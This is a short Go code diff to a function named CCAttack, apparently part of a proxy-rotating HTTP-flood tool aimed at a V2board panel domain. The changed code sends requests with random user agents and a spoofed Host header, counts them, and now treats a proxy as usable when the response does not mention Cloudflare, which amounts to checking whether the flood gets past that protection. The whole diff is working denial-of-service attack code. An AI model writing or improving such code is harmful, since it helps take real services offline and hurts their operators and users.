@@ -84,21 +84,20 @@ func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies *Nodes, err erro
 
 	resp, err := resty.New().
 		SetTransport(transport).SetTLSClientConfig(&tls.Config{ServerName: config.Cfg.V2boardDomain}).
-		SetCloseConnection(true).R().SetHeaders(map[string]string{"User-Agent": randUA(), "Host": config.Cfg.V2boardDomain}).
+		R().SetHeaders(map[string]string{"User-Agent": randUA(), "Host": config.Cfg.V2boardDomain}).
 		SetContext(ctx).Get(baseURL.String())
 	*counts++
+	*status = resp.StatusCode()
 	var (
 		buf map[string]interface{}
 	)
 	_ = json.Unmarshal(resp.Body(), &buf)
 	switch {
 	case resp.StatusCode() == 502:
-		*status = resp.StatusCode()
 		aliveProxies = p
 		fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
 		return
-	case resp.StatusCode() < 500 && resp.StatusCode() > 0:
-		*status = resp.StatusCode()
+	case !strings.Contains(string(resp.Body()), "cloudflare") && err == nil:
 		aliveProxies = p
 		if v, ok := buf["data"]; ok {
 			fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
